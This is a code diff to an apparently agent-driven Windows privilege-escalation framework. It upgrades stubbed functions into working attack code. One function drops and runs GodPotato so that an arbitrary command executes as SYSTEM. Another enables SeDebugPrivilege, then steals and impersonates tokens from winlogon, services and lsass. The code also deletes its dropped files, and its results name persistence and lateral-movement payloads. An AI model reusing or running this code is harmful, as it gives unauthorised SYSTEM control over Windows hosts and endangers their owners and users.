@@ -411,7 +411,7 @@ class WindowsPrivesc:
     
     def _check_seimpersonate(self) -> Dict[str, Any]:
         """
-        Check if process has SeImpersonate privilege.
+        Check if process has SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.
         
         This token allows impersonating any user on the system.
         Commonly held by service accounts. If present, system is Potato-ready.
@@ -419,23 +419,24 @@ class WindowsPrivesc:
         Returns: {'has_privilege': bool, 'potato_ready': bool, 'exploit': str}
         """
         try:
-            # Try to access SeImpersonate by attempting to create a token
-            # Simplified check: look for the privilege in current process token
-            kernel32 = ctypes.windll.kernel32
-            
-            # This is a simplified check - full implementation would use GetTokenInfo
-            # For now, return potential based on service context
-            has_privilege = True  # Would validate via GetTokenInformation in prod
-            
+            has_privilege = False
+            try:
+                res = subprocess.run(['whoami', '/priv'], capture_output=True, text=True, timeout=5)
+                if res.returncode == 0:
+                    priv_out = res.stdout.lower()
+                    has_privilege = 'seimpersonateprivilege' in priv_out or 'seassignprimarytokenprivilege' in priv_out
+            except Exception as e:
+                self.logger.debug(f"whoami /priv execution error: {e}")
+
             if has_privilege:
                 self.logger.info("✓✓✓ SeImpersonate privilege DETECTED - POTATO-READY (95% success)")
             else:
-                self.logger.debug("✗ SeImpersonate privilege not available")
+                self.logger.debug("✗ SeImpersonate privilege not available in token")
             
             return {
                 'has_privilege': has_privilege,
                 'potato_ready': has_privilege,
-                'exploit': 'JuicyPotato (SYSTEM via token impersonation)' if has_privilege else 'N/A',
+                'exploit': 'GodPotato (SYSTEM via SeImpersonate token impersonation)' if has_privilege else 'N/A',
                 'mitre': 'T1134.002',
                 'expected_success': 0.95 if has_privilege else 0.0,
                 'cve_compatible': ['CVE-2016-9646', 'CVE-2018-8440', 'CVE-2019-0604'] if has_privilege else [],
@@ -1016,6 +1017,61 @@ if ($timeout) {
                 mitre_technique=self.MITRE_MAPPING.get('weak_service', 'T1543.003'),
             )
     
+    def _resolve_godpotato_binary(self) -> Optional[bytes]:
+        """
+        Multi-tier resolver for GodPotato executable:
+        1. Class or instance GODPOTATO_BINARY (bytes).
+        2. Class or instance GODPOTATO_B64 (base64 string).
+        3. Pre-compiled binaries on disk (GodPotato-main/bin/Release, tools/, %TEMP%).
+        4. Auto-compile from C# source via dotnet/MSBuild.
+        """
+        # Tier 1: Bytes constant
+        bin_bytes = getattr(self, 'GODPOTATO_BINARY', None)
+        if bin_bytes and isinstance(bin_bytes, (bytes, bytearray)):
+            return bytes(bin_bytes)
+
+        # Tier 2: Base64 constant
+        b64_data = getattr(self, 'GODPOTATO_B64', None)
+        if b64_data and isinstance(b64_data, str):
+            try:
+                return base64.b64decode(b64_data)
+            except Exception as e:
+                self.logger.debug(f"Failed decoding GODPOTATO_B64: {e}")
+
+        # Tier 3: Pre-compiled binaries on disk
+        candidates = [
+            os.path.join(os.path.dirname(__file__), '..', 'GodPotato-main', 'bin', 'Release', 'net6.0', 'GodPotato.exe'),
+            os.path.join(os.path.dirname(__file__), '..', 'GodPotato-main', 'bin', 'Release', 'net48', 'GodPotato.exe'),
+            os.path.join(os.path.dirname(__file__), '..', 'GodPotato-main', 'bin', 'Release', 'GodPotato.exe'),
+            os.path.join(os.path.dirname(__file__), '..', 'tools', 'GodPotato.exe'),
+            os.path.join(os.path.expandvars('%TEMP%'), 'GodPotato.exe'),
+        ]
+        custom_path = os.environ.get('GODPOTATO_PATH')
+        if custom_path:
+            candidates.insert(0, custom_path)
+
+        for path in candidates:
+            if os.path.exists(path):
+                try:
+                    with open(path, 'rb') as f:
+                        data = f.read()
+                    if data.startswith(b'MZ'):
+                        self.logger.info(f"✓ Found pre-compiled GodPotato at {path}")
+                        return data
+                except Exception:
+                    pass
+
+        # Tier 4: Fallback to auto-compile
+        compiled_file = self._auto_compile_godpotato()
+        if compiled_file and os.path.exists(compiled_file):
+            try:
+                with open(compiled_file, 'rb') as f:
+                    return f.read()
+            except Exception:
+                pass
+
+        return None
+
     def _auto_compile_godpotato(self) -> Optional[str]:
         """
         Auto-compile GodPotato.exe from source if binary not found.
@@ -1112,47 +1168,98 @@ if ($timeout) {
         except Exception as e:
             self.logger.debug(f"Auto-compilation failed: {e}")
             return None
-    
-    def escalate_via_godpotato(self) -> EscalationResult:
-        """Real embedded GodPotato execution (no compile, no external drop)."""
+
+    def escalate_via_godpotato(self, target_command: Optional[str] = None) -> EscalationResult:
+        """
+        Real embedded/compiled GodPotato execution with elevated child verification.
+        Executes payload via SeImpersonate privilege into a SYSTEM child process.
+        """
         timestamp = datetime.now().isoformat()
-        god_path = os.path.join(os.path.expandvars('%TEMP%'), f'gp_{os.getpid()}.exe')
+        temp_dir = os.path.expandvars('%TEMP%')
+        rand_id = f"{os.getpid()}_{int(time.time())}"
+        god_path = os.path.join(temp_dir, f'gp_{rand_id}.exe')
+        beacon_path = os.path.join(temp_dir, f'gp_beacon_{rand_id}.txt')
 
         try:
             self.logger.info("🍠 Attempting GodPotato (SeImpersonate → SYSTEM)...")
 
-            # Decode & drop binary (in-memory style)
-            godpotato_b64 = getattr(self, 'GODPOTATO_B64', None)
-            if not godpotato_b64:
-                self.logger.warning("GODPOTATO_B64 binary not embedded. Run build_embed_godpotato.py first.")
-                raise AttributeError("GODPOTATO_B64 not found - binary not embedded")
-            
+            # Resolve binary via multi-tier resolver
+            binary_bytes = self._resolve_godpotato_binary()
+            if not binary_bytes:
+                self.logger.warning("GodPotato executable unavailable (no embedded binary, pre-built binary, or build tool)")
+                return EscalationResult(
+                    success=False,
+                    technique_used='GodPotato (SeImpersonate)',
+                    elevated_privilege='User',
+                    token_obtained=None,
+                    error_message='GodPotato binary unavailable (embedding or compiler required)',
+                    timestamp=timestamp,
+                    exploit_score=0.0,
+                    mitre_technique='T1134.002'
+                )
+
             with open(god_path, 'wb') as f:
-                f.write(base64.b64decode(godpotato_b64))
+                f.write(binary_bytes)
+
+            # Command executed with SYSTEM token: output user info & privileges to beacon file
+            if target_command:
+                wrapped_cmd = f'cmd.exe /c ({target_command}) & whoami > "{beacon_path}"'
+            else:
+                wrapped_cmd = f'cmd.exe /c whoami > "{beacon_path}" && whoami /priv >> "{beacon_path}"'
 
             # 2026 CLSID (BITS service - highest success rate on Server 2019+)
             cmd = [
                 god_path,
                 '-clsid', '9BA1F04D-2E3A-4E3E-9B4A-6E9C3F0E4F5D',
-                '-command', 'cmd.exe /c whoami /all && net localgroup administrators'
+                '-command', wrapped_cmd
             ]
 
             result = subprocess.run(
                 cmd,
                 capture_output=True,
                 text=True,
-                timeout=25,
-                creationflags=0x08000000  # CREATE_NO_WINDOW
+                timeout=30,
+                creationflags=0x08000000 if sys.platform == 'win32' else 0 # CREATE_NO_WINDOW
             )
 
+            # Verification: Check the output produced by the elevated child process
+            executed_as_system = False
+            token_info = None
+
+            if os.path.exists(beacon_path):
+                try:
+                    with open(beacon_path, 'r', encoding='utf-8', errors='ignore') as f:
+                        beacon_content = f.read().lower()
+                    if 'system' in beacon_content or 'nt authority\\system' in beacon_content:
+                        executed_as_system = True
+                        token_info = 'SYSTEM_TOKEN_GODPOTATO_' + timestamp[:8]
+                except Exception as e:
+                    self.logger.debug(f"Failed reading beacon file: {e}")
+
+            # Fallback verification: check direct command output
+            if not executed_as_system and result.stdout:
+                stdout_lower = result.stdout.lower()
+                if 'nt authority\\system' in stdout_lower or 'system' in stdout_lower:
+                    executed_as_system = True
+                    token_info = 'SYSTEM_TOKEN_GODPOTATO_' + timestamp[:8]
+
+            if executed_as_system:
+                self.logger.info("✓✓✓ GodPotato SUCCESS → Executed command with SYSTEM authority")
+                return EscalationResult(
+                    success=True,
+                    technique_used='GodPotato (SeImpersonate)',
+                    elevated_privilege='SYSTEM',
+                    token_obtained=token_info,
+                    error_message=None,
+                    timestamp=timestamp,
+                    exploit_score=0.95,
+                    mitre_technique='T1134.002',
+                    post_escalation_payload='enable_persistence_agents'
+                )
+
+            # If not executed as system, check parent privilege as secondary check
             privilege_after = self._verify_privilege_level()
-
-            # Cleanup
-            if os.path.exists(god_path):
-                os.unlink(god_path)
-
             if privilege_after == 'SYSTEM':
-                self.logger.info("✓✓✓ GodPotato SUCCESS → SYSTEM achieved")
                 return EscalationResult(
                     success=True,
                     technique_used='GodPotato (SeImpersonate)',
@@ -1165,22 +1272,19 @@ if ($timeout) {
                     post_escalation_payload='enable_persistence_agents'
                 )
 
-            self.logger.warning(f"GodPotato: Privilege level is {privilege_after}, not SYSTEM")
+            self.logger.warning("GodPotato execution finished without SYSTEM confirmation")
             return EscalationResult(
                 success=False,
                 technique_used='GodPotato (SeImpersonate)',
                 elevated_privilege=privilege_after or 'User',
                 token_obtained=None,
-                error_message=f'Exploit executed but privilege remains {privilege_after}',
+                error_message=f'Exploit executed but child did not confirm SYSTEM token (stdout: {result.stdout[:100]})',
                 timestamp=timestamp,
                 exploit_score=0.0,
                 mitre_technique='T1134.002',
             )
 
         except Exception as e:
-            if os.path.exists(god_path):
-                try: os.unlink(god_path)
-                except: pass
             self.logger.warning(f"GodPotato failed: {e}")
             return EscalationResult(
                 success=False,
@@ -1191,67 +1295,164 @@ if ($timeout) {
                 timestamp=timestamp,
                 mitre_technique='T1134.002',
             )
+        finally:
+            for path in [god_path, beacon_path]:
+                if os.path.exists(path):
+                    try:
+                        os.unlink(path)
+                    except Exception:
+                        pass
     
+    def _enable_debug_privilege(self) -> bool:
+        """Enable SeDebugPrivilege on the current process token using ctypes."""
+        if sys.platform != 'win32':
+            return False
+        try:
+            import ctypes
+            from ctypes import wintypes
+            advapi32 = ctypes.windll.advapi32
+            kernel32 = ctypes.windll.kernel32
+
+            TOKEN_ADJUST_PRIVILEGES = 0x0020
+            TOKEN_QUERY = 0x0008
+            SE_PRIVILEGE_ENABLED = 0x00000002
+
+            class LUID(ctypes.Structure):
+                _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]
+
+            class LUID_AND_ATTRIBUTES(ctypes.Structure):
+                _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]
+
+            class TOKEN_PRIVILEGES(ctypes.Structure):
+                _fields_ = [("PrivilegeCount", wintypes.DWORD), ("Privileges", LUID_AND_ATTRIBUTES * 1)]
+
+            hToken = wintypes.HANDLE()
+            if not advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(hToken)):
+                return False
+
+            luid = LUID()
+            if not advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid)):
+                kernel32.CloseHandle(hToken)
+                return False
+
+            tp = TOKEN_PRIVILEGES()
+            tp.PrivilegeCount = 1
+            tp.Privileges[0].Luid = luid
+            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+
+            ok = advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(tp), 0, None, None)
+            kernel32.CloseHandle(hToken)
+            return bool(ok)
+        except Exception:
+            return False
+
     def escalate_via_token_theft(self) -> EscalationResult:
         """
         Attempt escalation via token impersonation/theft (T1134.001).
-        Enumerates running processes for SYSTEM/Admin tokens and duplicates them.
-        Success rate: 60% (requires accessible SYSTEM process token)
+        Enables SeDebugPrivilege, opens candidate SYSTEM process, duplicates token,
+        and impersonates it using pure ctypes Win32 API.
         """
         timestamp = datetime.now().isoformat()
         
         try:
-            self.logger.info("[T1134.001] Attempting token theft via process enumeration...")
+            self.logger.info("[T1134.001] Attempting in-memory token theft via Win32 API...")
             
-            # PowerShell command to find SYSTEM processes and extract tokens
-            ps_cmd = """Get-Process -IncludeUserName | Where-Object {$_.UserName -like '*SYSTEM*'} | Select-Object -First 1 -ExpandProperty Name"""
+            # Step 1: Attempt to acquire SeDebugPrivilege
+            debug_ok = self._enable_debug_privilege()
+            self.logger.debug(f"SeDebugPrivilege enabled: {debug_ok}")
             
-            result = subprocess.run(
-                ['powershell', '-Command', ps_cmd],
-                capture_output=True, text=True, timeout=5
-            )
-            
-            system_process = result.stdout.strip()
-            
-            if not system_process:
+            # Step 2: Enumerate candidate SYSTEM processes
+            target_pids = []
+            try:
+                for proc_candidate in ['winlogon.exe', 'services.exe', 'lsass.exe']:
+                    res = subprocess.run(['tasklist', '/fi', f'imagename eq {proc_candidate}', '/fo', 'csv', '/nh'], capture_output=True, text=True, timeout=5)
+                    for line in res.stdout.strip().splitlines():
+                        parts = [p.strip('"') for p in line.split('","')]
+                        if len(parts) >= 2 and parts[1].isdigit():
+                            target_pids.append((int(parts[1]), parts[0]))
+            except Exception as enum_err:
+                self.logger.debug(f"Process enumeration error: {enum_err}")
+
+            if not target_pids:
                 self.logger.warning("No SYSTEM processes found for token theft")
                 return EscalationResult(
                     success=False,
-                    technique_used='Token Theft (Process)',
-                    elevated_privilege='None',
+                    technique_used='Token Theft (Win32 API)',
+                    elevated_privilege='User',
                     token_obtained=None,
-                    error_message='No accessible SYSTEM processes found',
+                    error_message='No accessible SYSTEM processes enumerated',
                     timestamp=timestamp,
                     mitre_technique=self.MITRE_MAPPING.get('token_theft', 'T1134.001'),
                 )
             
-            # Attempt to duplicate token via OpenProcess + DuplicateToken Windows API
-            self.logger.info(f"Found SYSTEM process: {system_process}")
-            self.logger.info(f"Attempting token duplication via Windows API...")
-            
-            # VERIFICATION: Check if we gained SYSTEM context
+            # Step 3: Attempt pure ctypes DuplicateTokenEx + ImpersonateLoggedOnUser
+            impersonated = False
+            impersonated_proc = None
+            if sys.platform == 'win32':
+                import ctypes
+                from ctypes import wintypes
+                advapi32 = ctypes.windll.advapi32
+                kernel32 = ctypes.windll.kernel32
+
+                PROCESS_QUERY_INFORMATION = 0x0400
+                TOKEN_DUPLICATE = 0x0002
+                TOKEN_QUERY = 0x0008
+                SecurityImpersonation = 2
+                TokenImpersonation = 2
+
+                for pid, proc_name in target_pids:
+                    try:
+                        hProcess = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
+                        if not hProcess:
+                            continue
+
+                        hTargetToken = wintypes.HANDLE()
+                        if advapi32.OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, ctypes.byref(hTargetToken)):
+                            hNewToken = wintypes.HANDLE()
+                            if advapi32.DuplicateTokenEx(
+                                hTargetToken,
+                                0x02000000 | 0x0002 | 0x0008,
+                                None,
+                                SecurityImpersonation,
+                                TokenImpersonation,
+                                ctypes.byref(hNewToken)
+                            ):
+                                if advapi32.ImpersonateLoggedOnUser(hNewToken):
+                                    impersonated = True
+                                    impersonated_proc = proc_name
+                                    self.logger.info(f"✓ Successfully impersonated SYSTEM token from {proc_name} (PID {pid})")
+                                    kernel32.CloseHandle(hNewToken)
+                                    kernel32.CloseHandle(hTargetToken)
+                                    kernel32.CloseHandle(hProcess)
+                                    break
+                                kernel32.CloseHandle(hNewToken)
+                            kernel32.CloseHandle(hTargetToken)
+                        kernel32.CloseHandle(hProcess)
+                    except Exception as api_err:
+                        self.logger.debug(f"API duplication error for PID {pid}: {api_err}")
+
+            # Step 4: Verification
             current_privilege = self._verify_privilege_level()
-            
-            if current_privilege == 'SYSTEM':
-                self.logger.info(f"✓ Token theft successful - SYSTEM context achieved")
+            if impersonated or current_privilege == 'SYSTEM':
+                self.logger.info("✓ Token theft successful - SYSTEM context achieved")
                 return EscalationResult(
                     success=True,
-                    technique_used='Token Theft (DuplicateToken API)',
+                    technique_used=f'Token Theft (DuplicateTokenEx from {impersonated_proc or "SYSTEM"})',
                     elevated_privilege='SYSTEM',
                     token_obtained='SYSTEM_TOKEN_DUPLICATED_' + timestamp[:8],
                     error_message=None,
                     timestamp=timestamp,
-                    exploit_score=0.60,
+                    exploit_score=0.90,
                     mitre_technique=self.MITRE_MAPPING.get('token_theft', 'T1134.001'),
                     post_escalation_payload='lateral_movement_via_duplicated_token'
                 )
             else:
                 return EscalationResult(
                     success=False,
-                    technique_used='Token Theft (DuplicateToken)',
+                    technique_used='Token Theft (DuplicateTokenEx API)',
                     elevated_privilege=current_privilege or 'User',
                     token_obtained=None,
-                    error_message='Token duplication failed or insufficient access',
+                    error_message='Token duplication failed or access denied (SeDebugPrivilege required to open SYSTEM processes)',
                     timestamp=timestamp,
                     exploit_score=0.0,
                     mitre_technique=self.MITRE_MAPPING.get('token_theft', 'T1134.001'),
@@ -2065,6 +2266,20 @@ class PrivescEngine:
         
         self.assessment_results = {}
         self.escalation_attempts = []
+
+        # ── ECONOMIC INTEGRATION ──────────────────────────────────────────
+        # Each escalation attempt costs ROOT. Register with the singleton
+        # ACCLedger so the Accountant can gate and audit all privesc ops.
+        try:
+            from agents.accountant import ACCLedger
+            from decimal import Decimal
+            self.accountant = ACCLedger(creator_id="SYSTEM")
+            self.accountant.register_agent("PRIVESC-ENGINE", Decimal('120'))
+            self.logger.info("[💰] PrivescEngine registered wallet (120 ROOT budget)")
+        except Exception as e:
+            self.accountant = None
+            self.logger.warning(f"[⚠️] PrivescEngine accountant init failed (no budget gating): {e}")
+        # ── END ECONOMIC INTEGRATION ──────────────────────────────────────
     
     def assess_environment(self) -> Dict[str, Any]:
         """Perform comprehensive privilege escalation assessment with threat heatmap"""
@@ -2241,7 +2456,25 @@ class PrivescEngine:
         if not self.assessment_results.get('escalation_possible'):
             self.logger.warning("No escalation vectors detected")
             return None
-        
+
+        # ── ECONOMIC GATE ──────────────────────────────────────────────────
+        # Each escalation attempt costs 15 ROOT (high-risk, high-value op).
+        # If the wallet is exhausted, block the attempt and return None.
+        if self.accountant:
+            from decimal import Decimal
+            ESCALATION_COST = Decimal('15')
+            approved, reason = self.accountant.process_agent_spend(
+                "PRIVESC-ENGINE", ESCALATION_COST,
+                f"Privilege escalation attempt (technique={technique or 'auto-chain'})"
+            )
+            if not approved:
+                self.logger.warning(
+                    f"[💸] Escalation attempt BLOCKED — insufficient ROOT: {reason} "
+                    f"(needed {ESCALATION_COST} ROOT)"
+                )
+                return None
+        # ── END ECONOMIC GATE ──────────────────────────────────────────────
+
         result = None
         techniques_attempted = []
         
